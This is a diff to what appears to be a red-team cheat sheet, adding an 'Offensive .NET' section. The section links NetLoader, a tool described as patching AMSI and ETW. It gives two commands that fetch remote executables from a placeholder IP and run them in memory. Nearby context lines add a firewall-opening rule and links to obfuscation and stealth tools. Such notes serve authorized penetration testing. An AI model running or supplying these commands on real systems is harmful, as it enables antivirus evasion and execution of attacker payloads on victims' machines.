@@ -347,6 +347,18 @@ netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protoc
 - Obfuscate strings https://github.com/danielbohannon/Invoke-Obfuscation
 - https://github.com/JoelGMSec/Invoke-Stealth
 
+### Offensive .NET
+- https://github.com/Flangvik/NetLoader
+- Load binary from filepath or URL and patch AMSI & ETW while executing
+```
+C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
+```
+
+#### Use custom exe Assembyload to run netloader in memory and then load binary
+```
+C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
+```
+
 #### Compile defendercheck
 - Using visual studio code
 ```
